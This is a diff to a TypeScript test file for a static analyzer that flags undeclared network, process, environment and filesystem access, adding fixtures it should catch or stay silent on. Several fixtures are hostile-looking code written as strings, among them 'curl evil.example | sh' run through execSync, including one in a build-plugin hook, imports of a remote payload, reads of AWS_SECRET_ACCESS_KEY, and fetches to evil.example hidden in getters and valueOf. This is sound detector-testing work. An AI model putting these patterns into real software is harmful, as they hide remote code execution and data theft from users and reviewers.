@@ -89,6 +89,83 @@ const caught: Record<string, string> = {
   e03_any_env_whole: "export function t() { return Object.keys((process as any).env); }",
   e04_angle_unknown_shape: "export async function t(u: string) { return (<{ fetch(u: string): Promise<unknown> }><unknown>globalThis).fetch(u); }",
   e05_any_member_as_value: "export function t() { const f = (globalThis as any).fetch; return f; }",
+  // Engine review (0.4): import() through a traced specifier, require() of a database client, URL imports.
+  en01_import_const_spec: "const spec = \"node:child_process\";\nexport async function t() { const cp = await import(spec); cp.exec(\"ls\"); }",
+  en02_import_as_const: "const M = { cp: \"node:child_process\" } as const;\nexport async function t() { (await import(M.cp)).execSync(\"id\"); }",
+  en03_import_enum: "enum Mod { Fs = \"node:fs\" }\nexport async function t() { (await import(Mod.Fs)).writeFileSync(\"/etc/x\", \"y\"); }",
+  en04_import_env_module: "const p = \"node:process\";\nexport async function t() { return (await import(p)).env.AWS_SECRET_ACCESS_KEY; }",
+  en05_import_annotated: "const spec = \"node:child_process\";\n/** @perm net(api.example.com) */\nexport async function t() { const cp = await import(spec); cp.exec(\"curl evil.example | sh\"); return fetch(\"https://api.example.com/\"); }",
+  en06_require_pg: "export function t() { const pg = require(\"pg\"); return new pg.Pool().query(\"DELETE FROM users\"); }",
+  en07_data_import: "import \"data:text/javascript,fetch('https://evil.example/')//.css\";\nexport const x = 1;",
+  en08_https_import: "import \"https://evil.example/payload.js\";\nexport const x = 1;",
+  en09_dynamic_data_import: "export async function t() { return import(\"data:text/javascript,export default 1\"); }",
+  en10_require_blob: "export function t() { return require(\"blob:nodedata:1234\"); }",
+  // Engine review (0.4): calls through interfaces that reached no implementation.
+  en11_fnprop_interface_class: "interface S { send: (u: string) => Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function make(): S { return new Real(); }\nexport function t(s: S, u: string) { return s.send(u); }",
+  en12_fnprop_interface_literal: "interface S { send: (u: string) => Promise<unknown> }\nconst impl: S = { send: (u) => fetch(u) };\nexport function t(s: S = impl, u = \"\") { return s.send(u); }",
+  en13_type_alias_implements: "type S = { send(u: string): Promise<unknown> };\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
+  en14_interface_extends_alias: "type Base = { send(u: string): Promise<unknown> };\ninterface S extends Base {}\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
+  en15_structural_class: "interface S { send(u: string): Promise<unknown> }\nclass Real { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send(u); }",
+  en16_untyped_literal: "interface S { send(u: string): Promise<unknown> }\nconst impl = { send(u: string) { return fetch(u); } };\nexport function t(s: S = impl, u = \"\") { return s.send(u); }",
+  en17_method_reference_map: "interface S { send(u: string): Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, us: string[]) { return Promise.all(us.map(s.send)); }",
+  en18_method_reference_call: "interface S { send(u: string): Promise<unknown> }\nclass Real implements S { send(u: string) { return fetch(u); } }\nexport function t(s: S, u: string) { return s.send.call(s, u); }",
+  en19_abstract_getter: "export abstract class B { abstract get url(): string; go() { return this.url; } }\nclass C extends B { get url() { void fetch(\"https://evil.example/\"); return \"\"; } }",
+  en20_interface_getter: "interface S { readonly url: string }\nclass C implements S { get url() { void fetch(\"https://evil.example/\"); return \"\"; } }\nexport function t(s: S) { return s.url; }",
+  // Engine review (0.4): entry points that weren't treated as exported, and plain decorators.
+  en22_export_default_hoc: "import { execSync } from \"node:child_process\";\nfunction withAuth(fn: (q: string) => void) { return (q: string) => { if (q) fn(q); }; }\nfunction handler(q: string) { execSync(q); }\nexport default withAuth(handler);",
+  en23_export_default_object_ref: "import { execSync } from \"node:child_process\";\nfunction handleRequest(q: string) { execSync(q); }\nexport default { fetch: handleRequest };",
+  en24_route_array: "import { execSync } from \"node:child_process\";\nexport const routes = [{ path: \"/\", handler: () => execSync(\"ls\") }];",
+  en25_toplevel_route_object: "import { execSync } from \"node:child_process\";\ndeclare const app25: { route(r: { url: string; handler: (q: string) => void }): void };\napp25.route({ url: \"/run\", handler: (q) => { execSync(q); } });",
+  en26_toplevel_route_method: "import { execSync } from \"node:child_process\";\ndeclare const app26: { route(r: { url: string; handler(q: string): void }): void };\napp26.route({ url: \"/run\", handler(q) { execSync(q); } });",
+  en27_export_equals_function: "import { execSync } from \"node:child_process\";\nfunction run() { execSync(\"ls\"); }\nexport = run;",
+  en28_export_equals_object: "import { execSync } from \"node:child_process\";\nexport = { run() { execSync(\"ls\"); } };",
+  en29_dotted_namespace: "import { execSync } from \"node:child_process\";\nexport namespace A.B { export function run() { execSync(\"ls\"); } }",
+  en30_static_object_in_class: "import { execSync } from \"node:child_process\";\nexport class C { static helpers = { run() { execSync(\"ls\"); } }; }",
+  en31_nested_export_literal: "import { execSync } from \"node:child_process\";\nexport const api = { v1: { run() { execSync(\"ls\"); } } };",
+  en32_config_plugin_hook: "import { execSync } from \"node:child_process\";\ndeclare function defineConfig(c: { plugins: { name: string; buildStart?(): void }[] }): unknown;\nexport default defineConfig({ plugins: [{ name: \"x\", buildStart() { execSync(\"curl evil.example | sh\"); } }] });",
+  en33_object_passed_by_function: "import { execSync } from \"node:child_process\";\ndeclare const app33: { use(r: object): void };\n/** @perm env(PORT) */\nexport function register() { const routes = { run: (q: string) => { execSync(q); } }; app33.use(routes); return process.env.PORT; }",
+  en34_inline_object_passed: "import { execSync } from \"node:child_process\";\ndeclare const app34: { use(r: object): void };\n/** @perm env(PORT) */\nexport function register() { app34.use({ run(q: string) { execSync(q); } }); return process.env.PORT; }",
+  // Was a known miss: a Proxy's handler is an object of functions handed to a call, so its
+  // traps are now entry points (or charged to the function creating it), though calls through
+  // the Proxy still aren't linked to them.
+  a20_proxy: "const p = new Proxy({}, { get: () => fetch });\nexport function t(u: string) { return (p as any).anything(u); }",
+  en35_class_decorator: "import { execSync } from \"node:child_process\";\nfunction logged(c: unknown, _ctx: ClassDecoratorContext) { execSync(\"ls\"); }\n@logged class C {}\nexport { C };",
+  en36_member_decorator: "import { execSync } from \"node:child_process\";\nfunction traced(m: unknown, _ctx: ClassMethodDecoratorContext) { execSync(\"ls\"); }\nexport class C { @traced m() {} }",
+  en37_decorator_member_access: "import { execSync } from \"node:child_process\";\nconst reg = { track(c: unknown, _x: ClassDecoratorContext) { execSync(\"ls\"); } };\n@reg.track class C {}\nexport { C };",
+  // Engine review (0.4): methods the language calls implicitly, and classes built by expressions.
+  en38_object_spread_getter: "const o38 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { return { ...o38 }; }",
+  en39_quoted_destructure_getter: "const o39 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { const { \"data\": d } = o39; return d; }",
+  en40_destructuring_assignment_getter: "const o40 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { let d: unknown; ({ data: d } = o40); return d; }",
+  en41_valueof_multiply: "const o41 = { valueOf() { void fetch(\"https://evil.example/x\"); return 1; } };\n// @ts-expect-error: arithmetic on an object runs its valueOf()\nexport function t() { return o41 * 2; }",
+  en42_valueof_unary_plus: "const o42 = { valueOf() { void fetch(\"https://evil.example/x\"); return 1; } };\nexport function t() { return +o42; }",
+  en43_valueof_compare: "const o43 = { valueOf() { void fetch(\"https://evil.example/x\"); return 1; } };\nexport function t() { return o43 < 3; }",
+  en44_valueof_compound: "const o44 = { toString() { void fetch(\"https://evil.example/x\"); return \"\"; } };\nexport function t() { let s = \"\"; s += o44; return s; }",
+  en45_yield_star: "class Feed45 { *[Symbol.iterator]() { yield fetch(\"https://evil.example/x\"); } }\nexport function* t() { yield* new Feed45(); }",
+  en46_using_dispose: "class Res46 { [Symbol.dispose]() { void fetch(\"https://evil.example/x\"); } }\nexport function t() { using r = new Res46(); return r; }",
+  en47_await_using: "class Res47 { async [Symbol.asyncDispose]() { void fetch(\"https://evil.example/x\"); } }\nexport async function t() { await using r = new Res47(); return r; }",
+  en48_instanceof: "class K48 { static [Symbol.hasInstance](x: unknown) { void fetch(\"https://evil.example/x\"); return x !== null; } }\nexport function t(x: unknown) { return x instanceof K48; }",
+  en49_class_expression_returned: "import { execSync } from \"node:child_process\";\nfunction make() { return class { x = execSync(\"ls\"); }; }\nexport function t() { const K = make(); return new K(); }",
+  en50_inline_class_expression: "import { execSync } from \"node:child_process\";\nexport function t() { return new (class { x = execSync(\"ls\"); })(); }",
+  en51_mixin: "import { execSync } from \"node:child_process\";\ntype Ctor = new (...a: any[]) => object;\nfunction Loud<T extends Ctor>(Base: T) { return class extends Base { constructor(...a: any[]) { super(...a); execSync(\"ls\"); } }; }\nclass Plain {}\nexport class Mixed extends Loud(Plain) {}",
+  en52_mixin_field: "import { execSync } from \"node:child_process\";\ntype Ctor = new (...a: any[]) => object;\nfunction Loud<T extends Ctor>(Base: T) { return class extends Base { x = execSync(\"ls\"); }; }\nclass Plain {}\nexport function t() { return new (Loud(Plain))(); }",
+  // An object of functions passed as an argument by a function is charged to that function (q isn't exported,
+  // so only the link from q, through t, catches these).
+  en53_arrow_in_object_argument: "declare function lib53(o: { where: () => unknown }): unknown;\nfunction q(u: string) { return lib53({ where: () => fetch(u) }); }\n/** @perm env(MODE) */\nexport function t(u: string) { return q(u); }",
+  en54_arrow_in_nested_argument: "declare function lib54(o: { hooks: { where: () => unknown }[] }): unknown;\nfunction q(u: string) { return lib54({ hooks: [{ where: () => fetch(u) }] }); }\n/** @perm env(MODE) */\nexport function t(u: string) { return q(u); }",
+  en55_valueof_through_and: "const o55 = { valueOf() { void fetch(\"https://evil.example/x\"); return 1; } };\n// @ts-expect-error: arithmetic on an object runs its valueOf()\nexport function t(f: boolean) { return (f && o55) * 2; }",
+  en56_destructuring_assignment_rest: "const o56 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { let r: object; ({ ...r } = o56); return r; }",
+  en57_array_destructuring_assignment: "class Feed57 { *[Symbol.iterator]() { yield fetch(\"https://evil.example/x\"); } }\nexport function t() { let a: unknown; [a] = new Feed57(); return a; }",
+  en58_new_through_union: "import { execSync } from \"node:child_process\";\nclass Loud { x = execSync(\"ls\"); }\nclass Quiet {}\nexport function t(c: boolean) { const K = c ? Loud : Quiet; return new K(); }",
+  en59_computed_key_destructure: "const KEY = \"data\";\nconst o59 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { const { [KEY]: d } = o59; return d; }",
+  en60_dynamic_key_destructure: "const o60 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t(k: \"data\") { const { [k]: d } = o60; return d; }",
+  en61_numeric_key_destructure: "const o61 = { get 0() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { const { 0: d } = o61; return d; }",
+  en62_spread_then_operator: "const o62 = { get data() { return fetch(\"https://evil.example/x\"); } };\nexport function t() { const s = { ...o62 } + \"\"; return s; }",
+  en63_array_of_objects_passed: "import { execSync } from \"node:child_process\";\ndeclare const app63: { use(r: object[]): void };\nfunction register() { const routes = [{ path: \"/\", run(q: string) { execSync(q); } }]; app63.use(routes); }\n/** @perm env(PORT) */\nexport function start() { register(); return process.env.PORT; }",
+  en64_nested_namespace: "import { execSync } from \"node:child_process\";\nexport namespace Outer { export namespace Inner { export function run() { execSync(\"ls\"); } } }",
+  en65_for_loop_function: "export function t() { for (const f = () => fetch(\"https://x.example/\"); ; ) { return f(); } }",
+  en66_export_equals_class: "import { execSync } from \"node:child_process\";\nexport = class { m() { execSync(\"m\"); } };",
+  en67_require_absolute: "export function t() { return require(\"/opt/app/missing.js\"); }",
+  en21_generic_alias: "type Repo<T> = { load(id: string): Promise<T> };\nclass Leads implements Repo<string> { async load(id: string) { return (await fetch(\"https://leads.example/\" + id)).text(); } }\nexport function t(r: Repo<string>, id: string) { return r.load(id); }",
   // Found in the 0.3 review: a const alias used as a value, rather than called.
   f01_alias_call: "import { execSync } from \"node:child_process\";\nconst run = execSync;\nexport function t() { return run.call(null, \"id\"); }",
   f02_alias_reflect_apply: "import { execSync } from \"node:child_process\";\nconst run = execSync;\nexport function t() { return Reflect.apply(run, null, [\"id\"]); }",
@@ -184,6 +261,28 @@ const silent: Record<string, string> = {
   b05_any_param: "export async function t(f: any, u: string) { return f(u); }",
   fp14_window_computed_read: "export function t(k: string) { return (window as any)[k]; }",
   fp15_harmless_module_any: "import * as path from \"node:path\";\nexport function t() { const p: any = path; return p.join(\"a\", \"b\"); }",
+  // Engine review (0.4): loading modules that touch nothing.
+  en_fp01_require_pure: "export function t() { const p = require(\"path\"); return p.join(\"a\", \"b\"); }",
+  en_fp02_import_const_pure: "const spec = \"node:path\";\nexport async function t() { return (await import(spec)).join(\"a\", \"b\"); }",
+  en_fp03_stylesheet: "import \"./missing-styles.css\";\nimport \"./missing-styles.css?inline\";\nexport const x = 1;",
+  en_fp04_node_url: "export function t() { return new URL(\"data:text/plain,hello\").href; }",
+  // A class with a same-named member that can't stand in for the interface isn't an implementation.
+  // (All cases share one project, so these use member names no other case has.)
+  en_fp05_unrelated_same_name: "interface Pager { page(oncall: string): Promise<unknown> }\nclass Beeper { page(level: number) { return fetch(\"https://beeper.example/\" + level); } }\nexport function t(p: Pager, who: string) { return p.page(who); }\nexport const b = Beeper;",
+  // A call on one particular object reaches that object's method, not every look-alike.
+  en_fp07_object_method: "const relay = { forward(u: string) { return u.length; } };\nconst courier = { forward(u: string) { void fetch(u); return u.length; } };\nexport function t(u: string) { return relay.forward(u); }\nexport const c = courier;",
+  // Objects of functions that are created but not handed to anything, or hold no functions.
+  en_fp08_local_object: "/** @perm env(MODE) */\nexport function t() { const local = { run: () => fetch(\"https://x.example/\") }; void local; return process.env.MODE; }",
+  en_fp09_data_object_passed: "declare function report(o: object): void;\n/** @perm env(MODE) */\nexport function t() { report({ level: \"info\", mode: process.env.MODE }); }",
+  en_fp10_harmless_decorator: "function sealed(c: unknown, _ctx: ClassDecoratorContext) { Object.seal(c); }\n@sealed class C {}\nexport { C };",
+  // Copying an object runs its getters, not its methods; arithmetic on numbers and dates runs no project code.
+  en_fp11_spread_methods: "const o = { a: 1, run() { return fetch(\"https://x.example/\"); } };\nexport function t() { return { ...o }; }",
+  en_fp12_arithmetic: "export function t(a: number, b: Date, c: Date) { return a * 2 + +(b < c) - (b.valueOf() % 7); }",
+  // `!` converts to a boolean without calling anything; a namespace that isn't exported is private.
+  en_fp13_logical_not: "const o = { valueOf() { void fetch(\"https://x.example/\"); return 1; } };\nexport function t() { return !o; }",
+  en_fp14_private_namespace: "namespace Hidden { export function run() { return fetch(\"https://x.example/\"); } }\nexport const n = 1;\nvoid Hidden;",
+  en_fp15_extends_library_class: "import { EventEmitter } from \"node:events\";\nexport class Bus extends EventEmitter {}\nexport function t() { return new Bus(); }",
+  en_fp06_missing_members: "interface Uplink { transmit(u: string): void; hangUp(): void }\nconst partial = { transmit(u: string) { void fetch(u); } };\nexport function t(l: Uplink, u: string) { l.transmit(u); return partial; }",
   // Capability functions and classes mentioned without being called or passed on.
   fp16_instanceof: "export function t(x: unknown) { return x instanceof WebSocket; }",
   fp17_feature_detection: "export function t() { if (globalThis.fetch && !globalThis.WebSocket) return 1; return typeof EventSource === \"undefined\" ? 2 : 3; }",
@@ -214,7 +313,6 @@ const silent: Record<string, string> = {
 };
 
 const knownMisses: Record<string, { why: string; code: string }> = {
-  a20_proxy: { why: "Proxy traps (documented limit)", code: "const p = new Proxy({}, { get: () => fetch });\nexport function t(u: string) { return (p as any).anything(u); }" },
   c10_global_alias_any: { why: "a global stored as any, then a capability called through it (left silent: `const w = window as any` is common and harmless)", code: "export async function t(u: string) { const w = window as any; return w.fetch(u); }" },
 };
 
